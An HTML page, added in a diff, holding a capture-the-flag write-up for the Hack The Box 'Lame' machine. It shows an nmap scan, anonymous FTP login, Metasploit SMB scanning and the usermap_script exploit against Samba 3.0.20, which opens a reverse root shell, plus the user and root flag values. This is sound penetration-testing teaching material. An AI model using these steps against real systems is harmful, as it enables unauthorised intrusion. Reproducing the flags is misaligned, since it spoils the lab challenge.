@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Lame Write-Up</title>
+        
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+        
+        <style>
+.task-list-item { list-style-type: none; } .task-list-item-checkbox { margin-left: -20px; vertical-align: middle; }
+</style>
+        <style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        
+        
+    </head>
+    <body class="vscode-light">
+        <h1 id="lame-write-up">Lame Write-Up</h1>
+<p>Machine IP - 10.10.10.3</p>
+<h3 id="initial-phase">Initial Phase</h3>
+<p>Initially starting with an nmap scan -</p>
+<pre><code><code><div>root@kali:~/Desktop/Hack The Box/lame# nmap -F 10.10.10.3
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-11 19:17 +04
+Nmap scan report for 10.10.10.3
+Host is up (0.37s latency).
+Not shown: 96 filtered ports
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds
+</div></code></code></pre>
+<p>Immediately FTP seems to be an attack vector. Therefore, trying an anonymous login, we get in -</p>
+<pre><code><code><div>root@kali:~/Desktop/Hack The Box/lame# ftp 10.10.10.3
+Connected to 10.10.10.3.
+220 (vsFTPd 2.3.4)
+Name (10.10.10.3:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
+drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
+226 Directory send OK.
+</div></code></code></pre>
+<p>The messages here don't seem to be legit and doesn't prove worth continuing as changing the directories also doesn't work. Now we can turn to other ports. SSH seems totally out of reach; Therefore, turning to the Samba ports. We can search for scanners of samba on metasploit -</p>
+<pre><code><code><div>msf5&gt; search scanner/smb
+
+Matching Modules
+================
+
+   Name                                         Disclosure Date  Rank    Check  Description
+   ----                                         ---------------  ----    -----  -----------
+   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal  Yes    DCOM Exec
+   auxiliary/scanner/smb/impacket/secretsdump                    normal  Yes    DCOM Exec
+   auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal  Yes    WMI Exec
+   auxiliary/scanner/smb/pipe_auditor                            normal  Yes    SMB Session Pipe Auditor
+   auxiliary/scanner/smb/pipe_dcerpc_auditor                     normal  Yes    SMB Session Pipe DCERPC Auditor
+   auxiliary/scanner/smb/psexec_loggedin_users                   normal  Yes    Microsoft Windows Authenticated Logged In Users Enumeration
+   auxiliary/scanner/smb/smb1                                    normal  Yes    SMBv1 Protocol Detection
+   auxiliary/scanner/smb/smb2                                    normal  Yes    SMB 2.0 Protocol Detection
+   auxiliary/scanner/smb/smb_enum_gpp                            normal  Yes    SMB Group Policy Preference Saved Passwords Enumeration
+   auxiliary/scanner/smb/smb_enumshares                          normal  Yes    SMB Share Enumeration
+   auxiliary/scanner/smb/smb_enumusers                           normal  Yes    SMB User Enumeration (SAM EnumUsers)
+   auxiliary/scanner/smb/smb_enumusers_domain                    normal  Yes    SMB Domain User Enumeration
+   auxiliary/scanner/smb/smb_login                               normal  Yes    SMB Login Check Scanner
+   auxiliary/scanner/smb/smb_lookupsid                           normal  Yes    SMB SID User Enumeration (LookupSid)
+   auxiliary/scanner/smb/smb_ms17_010                            normal  Yes    MS17-010 SMB RCE Detection
+   auxiliary/scanner/smb/smb_uninit_cred                         normal  Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
+   auxiliary/scanner/smb/smb_version                             normal  Yes    SMB Version Detection
+
+
+msf5 auxiliary(scanner/smb/smb_version) &gt; use auxiliary/scanner/smb/smb_version
+msf5 auxiliary(scanner/smb/smb_version) &gt; set RHOST 10.10.10.3
+RHOST =&gt; 10.10.10.3
+msf5 auxiliary(scanner/smb/smb_version) &gt; run
+
+[*] 10.10.10.3:445        - Host could not be identified: Unix (Samba 3.0.20-Debian)
+[*] 10.10.10.3:445        - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</div></code></code></pre>
+<p>This gives us the version of the SMB.</p>
+<h3 id="attack-phase">Attack Phase</h3>
+<p>Now that the version of the SMB is known, we can simply google <code>samba 3.0.20 exploit</code>. The first thing that turns up is an exploit from metasploit itself on the website of rapid7. The path for the exploit is given, therefore this can be tried out in metasploit as follows -</p>
+<pre><code><code><div>msf5 auxiliary(scanner/smb/smb_version) &gt; use exploit/multi/samba/usermap_script
+msf5 exploit(multi/samba/usermap_script) &gt; show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target address range or CIDR identifier
+   RPORT   139              yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(multi/samba/usermap_script) &gt; set RHOST 10.10.10.3
+RHOST =&gt; 10.10.10.3
+msf5 exploit(multi/samba/usermap_script) &gt; exploit
+
+[*] Started reverse TCP double handler on 10.10.14.68:4444
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo AyjQ29Pvdsjki9wn;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: &quot;sh: line 2: Connected: command not found\r\nsh: line 3: Escape: command not found\r\nAyjQ29Pvdsjki9wn\r\n&quot;
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.10.14.68:4444 -&gt; 10.10.10.3:35452) at 2019-04-11 19:29:29 +0400
+
+whoami
+root
+python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;);'
+root@lame:/# cd /home
+cd /home
+root@lame:/home# ls
+ls
+ftp  makis  service  user
+root@lame:/home# cd makis
+cd makis
+root@lame:/home/makis# ls
+ls
+user.txt
+root@lame:/home/makis# cat user.txt
+cat user.txt
+69454a937d94f5f0225ea00acd2e84c5
+root@lame:/home/makis# cd /root
+cd /root
+root@lame:/root# ls
+ls
+Desktop  reset_logs.sh  root.txt  vnc.log
+root@lame:/root# cat root.txt
+cat root.txt
+92caac3be140ef409e45721348a4e9df
+</div></code></code></pre>
+<p>And that's how we obtain root user on the box and therefore get the root and user flags.</p>
+
+    </body>
+    </html>
